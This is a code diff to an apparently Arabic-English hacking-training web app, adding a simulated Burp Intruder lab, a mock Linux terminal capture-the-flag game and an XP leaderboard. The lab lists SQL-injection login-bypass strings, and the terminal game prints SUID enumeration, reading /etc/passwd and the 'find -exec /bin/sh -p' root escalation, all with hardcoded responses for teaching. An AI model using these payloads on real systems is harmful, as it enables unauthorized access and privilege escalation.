+                      <button class="hunt-btn primary" onclick="startBurpIntruder()" style="width:100%; min-height:45px; font-weight:bold; font-size:0.95rem; border-radius:6px; box-shadow:0 0 15px rgba(0, 255, 102, 0.2);">
+                        🚀 ابدأ هجوم التخمين (Start Attack)
+                      </button>
+                    </div>
+                  </div>
+
+                  <!-- Intruder Console/Results table -->
+                  <div id="burp-results-section" style="display:none; border-top:1px solid rgba(255,255,255,0.06); padding-top:20px;">
+                    <h4 style="color:#ffaa00; margin:0 0 10px 0; font-size:0.9rem; display:flex; align-items:center; gap:6px;">
+                      <span>📊</span> نتائج الهجوم (Attack Results Log):
+                    </h4>
+                    <div style="background:#030308; border:1px solid rgba(255,255,255,0.08); border-radius:8px; overflow:hidden;">
+                      <div style="max-height:200px; overflow-y:auto; font-family:'Fira Code', monospace; font-size:0.75rem;">
+                        <table style="width:100%; border-collapse:collapse; text-align:left; color:#fff;">
+                          <thead>
+                            <tr style="background:#0a0a12; border-bottom:1px solid rgba(255,255,255,0.1); color:var(--text-muted);">
+                              <th style="padding:10px 15px;">Req #</th>
+                              <th style="padding:10px 15px;">Payload</th>
+                              <th style="padding:10px 15px;">Status</th>
+                              <th style="padding:10px 15px;">Length</th>
+                            </tr>
+                          </thead>
+                          <tbody id="burp-results-tbody">
+                            <!-- Injected by script -->
+                          </tbody>
+                        </table>
+                      </div>
+                    </div>
+
+                    <!-- Success panel -->
+                    <div id="burp-success-alert" style="display:none; margin-top:15px; background:rgba(0,255,102,0.05); border:1px solid var(--accent-green); border-radius:8px; padding:15px; color:#fff; direction:rtl; text-align:right;">
+                      <div style="font-weight:bold; color:var(--accent-green); margin-bottom:5px; font-size:0.95rem;">✔️ نجح الاختراق! / Exploitation Successful!</div>
+                      <p style="margin:0; font-size:0.85rem; color:var(--text-secondary); line-height:1.5;">
+                        عثرنا على بايلود التخطي الناجح! استجابة السيرفر برمز الحالة <strong style="color:var(--accent-cyan);">302 Found</strong> وحجم استجابة مختلف تؤكد نجاح الهجوم والدخول لحساب الإدارة. <strong>(+40 XP)</strong>
+                      </p>
+                    </div>
+                  </div>
+                </div>
+              </div>
+
             </div>
           </div>
         </div>
@@ -18345,6 +18875,71 @@
       if (input) setTimeout(function() { input.focus(); }, 100);
     }
 
+    function startBurpIntruder() {
+      const selectEl = document.getElementById('burp-payload-select');
+      if (!selectEl) return;
+      const val = selectEl.value;
+
+      const resultsSection = document.getElementById('burp-results-section');
+      const tbody = document.getElementById('burp-results-tbody');
+      const successAlert = document.getElementById('burp-success-alert');
+
+      if (resultsSection) resultsSection.style.display = 'block';
+      if (tbody) tbody.innerHTML = '';
+      if (successAlert) successAlert.style.display = 'none';
+
+      let payloads = [];
+      if (val === 'auth_bypass') {
+        payloads = [
+          { payload: "admin' --", status: 200, length: "1042 B" },
+          { payload: "admin' #", status: 200, length: "1042 B" },
+          { payload: "admin'/*", status: 200, length: "1042 B" },
+          { payload: "' OR '1'='1' --", status: 302, length: "425 B", success: true },
+          { payload: "' OR '1'='1'/*", status: 200, length: "1042 B" }
+        ];
+      } else {
+        payloads = [
+          { payload: "password", status: 403, length: "822 B" },
+          { payload: "admin123", status: 403, length: "822 B" },
+          { payload: "token_abdo_123", status: 302, length: "425 B", success: true },
+          { payload: "qwerty", status: 403, length: "822 B" },
+          { payload: "123456", status: 403, length: "822 B" }
+        ];
+      }
+
+      payloads.forEach(function(item, index) {
+        setTimeout(function() {
+          const row = document.createElement('tr');
+          row.style.borderBottom = '1px solid rgba(255,255,255,0.04)';
+          row.style.background = item.success ? 'rgba(0, 255, 102, 0.08)' : 'transparent';
+          if (item.success) {
+            row.style.color = 'var(--accent-green)';
+            row.style.fontWeight = 'bold';
+          }
+          
+          row.innerHTML = `
+            <td style="padding:10px 15px; color:rgba(255,255,255,0.6);">${index + 1}</td>
+            <td style="padding:10px 15px; font-family:monospace; color:${item.success ? 'var(--accent-green)' : '#fff'};">${item.payload}</td>
+            <td style="padding:10px 15px; color:${item.status === 302 ? 'var(--accent-cyan)' : item.status === 200 ? '#fff' : '#ff5555'};">${item.status}</td>
+            <td style="padding:10px 15px; color:rgba(255,255,255,0.6);">${item.length}</td>
+          `;
+          tbody.appendChild(row);
+          
+          // Sound effect
+          if (item.success) {
+            playClick(1000, 0.1, 0.15);
+            setTimeout(function() { playClick(1500, 0.1, 0.2); }, 80);
+            
+            if (successAlert) successAlert.style.display = 'block';
+            localStorage.setItem('lab_completed_burp', 'true');
+            updateDashboardProgress();
+          } else {
+            playClick(600, 0.03, 0.05);
+          }
+        }, index * 400);
+      });
+    }
+
     let gameLevel = parseInt(localStorage.getItem('gameLevel')) || 1;
     let gameScore = parseInt(localStorage.getItem('gameScore')) || 0;
     let flagsCaptured = JSON.parse(localStorage.getItem('flagsCaptured')) || [];
@@ -18660,7 +19255,7 @@
         return;
       }
 
-      // Standard commands inside box
+      // Basic commands supported across all levels:
       if (cmd === 'whoami') {
         if (gameLevel >= 5) {
           printLineToTerminal('root');
@@ -18693,31 +19288,122 @@
         return;
       }
 
-      // Level 1: Enumeration
-      if (gameLevel === 1) {
-        if (cmd === 'ls') {
+      if (cmd === 'hostname') {
+        printLineToTerminal('vulnerable-box');
+        return;
+      }
+
+      if (cmd === 'sudo' && args[0] === '-l') {
+        printLineToTerminal(
+          'Matching Defaults entries for visitor on vulnerable-box:<br>' +
+          '    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin<br><br>' +
+          'User visitor may run the following commands on vulnerable-box:<br>' +
+          '    (root) NOPASSWD: /usr/bin/find'
+        );
+        return;
+      }
+
+      if (cmd === 'history') {
+        printLineToTerminal(
+          '    1  cd /home/visitor<br>' +
+          '    2  ls -la<br>' +
+          '    3  unzip -t secret_backup.zip<br>' +
+          '    4  find / -perm -u=s -type f 2&gt;/dev/null<br>' +
+          '    5  history'
+        );
+        return;
+      }
+
+      if (cmd === 'ls') {
+        if (gameLevel === 1) {
           printLineToTerminal('notes.txt   secret_backup.zip');
-        } else if (cmd === 'cat' && args[0] === 'notes.txt') {
-          printLineToTerminal(
-            'Secure archive credentials:<br>' +
-            'Archive file  : secret_backup.zip<br>' +
-            'Decryption Key: shadow_key_2026<br><br>' +
-            '<span class="text-neon-green">[+] Completed Level 1! Flag: FLAG{LINUX_LS_CAT_OK}</span><br>' +
-            '<span class="text-neon-cyan">[!] Next Task: Extract the backup. Run "unzip secret_backup.zip"</span>'
-          );
-          if (!flagsCaptured.includes('FLAG{LINUX_LS_CAT_OK}')) {
-            flagsCaptured.push('FLAG{LINUX_LS_CAT_OK}');
-            gameScore += 10;
-          }
-          gameLevel = 2;
-          updateHUD();
+        } else if (gameLevel >= 5) {
+          printLineToTerminal('flag.txt   root_notes.txt');
         } else {
-          printLineToTerminal(`Run "ls" to view files, or "cat notes.txt" to read the notes.`);
+          printLineToTerminal('notes.txt   secret_backup.zip   security_notes.md   audit_script.sh');
         }
         return;
       }
 
-      // Level 2: Unzip backup
+      if (cmd === 'cat') {
+        const file = args[0];
+        if (!file) {
+          printLineToTerminal('cat: missing operand');
+          return;
+        }
+
+        if (file === 'notes.txt') {
+          printLineToTerminal(
+            'Secure archive credentials:<br>' +
+            'Archive file  : secret_backup.zip<br>' +
+            'Decryption Key: shadow_key_2026'
+          );
+          if (gameLevel === 1) {
+            printLineToTerminal(
+              '<br><span class="text-neon-green">[+] Completed Level 1! Flag: FLAG{LINUX_LS_CAT_OK}</span><br>' +
+              '<span class="text-neon-cyan">[!] Next Task: Extract the backup. Run "unzip secret_backup.zip"</span>'
+            );
+            if (!flagsCaptured.includes('FLAG{LINUX_LS_CAT_OK}')) {
+              flagsCaptured.push('FLAG{LINUX_LS_CAT_OK}');
+              gameScore += 10;
+            }
+            gameLevel = 2;
+            updateHUD();
+          }
+          return;
+        }
+
+        if (file === 'security_notes.md') {
+          if (gameLevel >= 2) {
+            printLineToTerminal(
+              '=== Security Audit Notes ===<br>' +
+              '- Found multiple outdated packages.<br>' +
+              '- SUID permissions need to be reviewed.<br>' +
+              '- Dev team left execution wrappers with sticky bits active on /usr/bin/find.'
+            );
+          } else {
+            printLineToTerminal('cat: security_notes.md: No such file or directory');
+          }
+          return;
+        }
+
+        if (file === 'audit_script.sh') {
+          if (gameLevel >= 2) {
+            printLineToTerminal(
+              '#!/bin/bash<br>' +
+              'echo "[*] Auditing vulnerable-box permissions..."<br>' +
+              'echo "[*] Checking /usr/bin/find SUID flags..."'
+            );
+          } else {
+            printLineToTerminal('cat: audit_script.sh: No such file or directory');
+          }
+          return;
+        }
+
+        if (file === '/etc/passwd') {
+          printLineToTerminal(
+            'root:x:0:0:root:/root:/bin/bash<br>' +
+            'daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin<br>' +
+            'bin:x:2:2:bin:/bin:/usr/sbin/nologin<br>' +
+            'visitor:x:1000:1000:visitor:/home/visitor:/bin/bash'
+          );
+          return;
+        }
+
+        if (file === 'flag.txt' || file === '/root/flag.txt') {
+          if (gameLevel >= 5) {
+            printLineToTerminal('FLAG{SYSTEM_OWNED_ROOT}');
+          } else {
+            printLineToTerminal('cat: flag.txt: Permission denied');
+          }
+          return;
+        }
+
+        printLineToTerminal(`cat: ${file}: No such file or directory`);
+        return;
+      }
+
+      // Level 2 unzip
       if (gameLevel === 2) {
         if (cmd === 'unzip' && args[0] === 'secret_backup.zip') {
           printLineToTerminal('[?] Enter archive password (type it and hit Enter):');
@@ -18728,9 +19414,8 @@
         return;
       }
 
-      // Level 3: SUID Enumeration
+      // Level 3 SUID find enum
       if (gameLevel === 3) {
-        // Match standard SUID find command
         const fullString = [cmd, ...args].join(' ');
         if (fullString.includes('find /') && fullString.includes('-perm') && fullString.includes('-u=s')) {
           printLineToTerminal(
@@ -18746,7 +19431,6 @@
             '    Command: find . -exec /bin/sh -p \\; -quit</span>'
           );
           if (!flagsCaptured.includes('FLAG{SUID_FIND_FOUND}')) {
-            flagsCaptured.push('FLAG{FLAG{SUID_FIND_FOUND}}'); // Fix tag
             flagsCaptured.push('FLAG{SUID_FIND_FOUND}');
             gameScore += 20;
           }
@@ -18758,7 +19442,7 @@
         return;
       }
 
-      // Level 4: Privilege Escalation Exploit
+      // Level 4 escape
       if (gameLevel === 4) {
         const fullString = [cmd, ...args].join(' ');
         if (fullString.startsWith('find') && fullString.includes('-exec') && fullString.includes('/bin/sh')) {
@@ -18784,14 +19468,14 @@
             printLineToTerminal(
               `<pre class="text-neon-green">
        ___________
-      '._==_==_=_.'
+      '._==_==_=_.\'
       .-\\:      /-.
      | (|:.     |) |
-      '-|:.     |-'
+      \'-|:.     |-\'
         \\::.    /
-         '::. .'
+         \'::. .\'
            ) (
-         _.' '._
+         _.\' \'.__
         \`"""""""\`
 </pre>` +
               '<span class="text-neon-cyan">[+] CONGRATULATIONS! Target compromised. You have mastered basic Linux privilege escalation.</span><br>' +
@@ -18806,11 +19490,7 @@
       }
 
       if (gameLevel >= 5) {
-        if (cmd === 'cat' && args[0] === '/root/flag.txt') {
-          printLineToTerminal('FLAG{SYSTEM_OWNED_ROOT}');
-        } else {
-          printLineToTerminal(`root@vulnerable-box:# ${cmd}: command executed (permission granted).`);
-        }
+        printLineToTerminal(`root@vulnerable-box:# ${cmd}: command executed (permission granted).`);
         return;
       }
 
@@ -19138,6 +19818,10 @@
     // EXPLORER (3-PANE) LOGIC
     // ─────────────────────────────────────────────────────────
     function openExplorerFolder(folderId) {
+      // Clear tool search input and show all items in the folder
+      const searchInput = document.getElementById('explorerToolSearch');
+      if (searchInput) searchInput.value = '';
+
       // 1. Highlight folder in sidebar
       document.querySelectorAll('.explorer-folder').forEach(el => el.classList.remove('active'));
       const activeFolder = document.getElementById('ef-' + folderId);
@@ -19147,7 +19831,11 @@
       document.getElementById('emptyToolsState').style.display = 'none';
 
       // 3. Show correct tools list
-      document.querySelectorAll('.tools-list').forEach(el => el.style.display = 'none');
+      document.querySelectorAll('.tools-list').forEach(el => {
+        el.style.display = 'none';
+        // Restore visibility of list items when switching folders
+        el.querySelectorAll('.tool-list-item').forEach(item => item.style.display = 'flex');
+      });
       const activeTools = document.getElementById('tools-' + folderId);
       if (activeTools) activeTools.style.display = 'flex';
 
@@ -19159,6 +19847,23 @@
       if (terminalInitialized) {
         printLineToTerminal(`\n[info] Explorer navigated to: /usr/share/${folderId}`, 'text-neon-cyan');
       }
+    }
+
+    function filterExplorerTools() {
+      const query = document.getElementById('explorerToolSearch').value.toLowerCase().trim();
+      const activeToolsList = document.querySelector('.tools-list[style*="display: flex"]') || document.querySelector('.tools-list:not([style*="display: none"])');
+      if (!activeToolsList) return;
+
+      const items = activeToolsList.querySelectorAll('.tool-list-item');
+      items.forEach(item => {
+        const name = item.querySelector('.t-name').innerText.toLowerCase();
+        const meta = item.querySelector('.t-meta').innerText.toLowerCase();
+        if (name.includes(query) || meta.includes(query)) {
+          item.style.display = 'flex';
+        } else {
+          item.style.display = 'none';
+        }
+      });
     }
 
     function openExplorerTool(toolId) {
@@ -19993,6 +20698,50 @@
       selectCommandPaletteItem(action);
     }
 
+    function updateLeaderboard(abdoXp) {
+      const competitors = [
+        { name: 'Abdo (أنت)', xp: abdoXp, isUser: true, avatar: '👤' },
+        { name: 'Root_Buster', xp: 3200, isUser: false, avatar: '💀' },
+        { name: 'WAF_Bypasser', xp: 2800, isUser: false, avatar: '🛡️' },
+        { name: 'Crypt0_King', xp: 2100, isUser: false, avatar: '🔑' },
+        { name: 'ScriptKiddie', xp: 1200, isUser: false, avatar: '👶' }
+      ];
+
+      competitors.sort((a, b) => b.xp - a.xp);
+
+      const container = document.getElementById('ctf-leaderboard-rows');
+      if (container) {
+        container.innerHTML = '';
+        competitors.forEach((c, index) => {
+          const rank = index + 1;
+          let rankColor = '#fff';
+          if (rank === 1) rankColor = '#ffd700';
+          else if (rank === 2) rankColor = '#c0c0c0';
+          else if (rank === 3) rankColor = '#cd7f32';
+
+          const row = document.createElement('div');
+          row.style.cssText = `
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 8px 12px;
+            background: ${c.isUser ? 'rgba(0, 229, 255, 0.08)' : 'rgba(255,255,255,0.02)'};
+            border: 1px solid ${c.isUser ? 'var(--accent-cyan)' : 'rgba(255,255,255,0.05)'};
+            border-radius: 6px;
+            font-size: 0.85rem;
+          `;
+          row.innerHTML = `
+            <div style="display:flex; align-items:center; gap:10px;">
+              <span style="font-family:monospace; font-weight:bold; color:${rankColor}; width:20px;">#${rank}</span>
+              <span>${c.avatar} ${c.name}</span>
+            </div>
+            <span style="font-family:monospace; font-weight:bold; color:${c.isUser ? 'var(--accent-cyan)' : 'var(--text-secondary)'};">${c.xp} XP</span>
+          `;
+          container.appendChild(row);
+        });
+      }
+    }
+
     // Calculate dynamic completion progress
     function updateDashboardProgress() {
       // 1. Visited methodology count
@@ -20046,8 +20795,10 @@
       const completedItems = count + completedBookSections + completedLabsCount;
       const globalPct = Math.min(Math.round((completedItems / totalItems) * 100), 100);
 
-      // XP calculation
-      const totalXP = (count * 10) + (completedBookSections * 50) + (completedBooksCount * 1000) + (completedLabsCount * 200);
+      // XP calculation + Arena XP + Burp Simulator XP
+      const arenaXp = parseInt(localStorage.getItem('arena_xp')) || 0;
+      const burpXp = localStorage.getItem('lab_completed_burp') === 'true' ? 40 : 0;
+      const totalXP = (count * 10) + (completedBookSections * 50) + (completedBooksCount * 1000) + (completedLabsCount * 200) + arenaXp + burpXp;
 
       const pctEl = document.getElementById('dashProgressPct');
       const fillEl = document.getElementById('dashProgressFill');
@@ -20059,6 +20810,12 @@
       if (fillEl) fillEl.style.width = globalPct + '%';
       if (completedLabsEl) completedLabsEl.textContent = completedLabsCount + ' / 10';
       if (totalXpEl) totalXpEl.textContent = totalXP + ' XP';
+      
+      // Sync with global localStorage for badges
+      localStorage.setItem('academy_xp', totalXP);
+
+      // Update leaderboard sorting dynamically
+      updateLeaderboard(totalXP);
 
       // Set last active mission text
       if (nextChEl) {
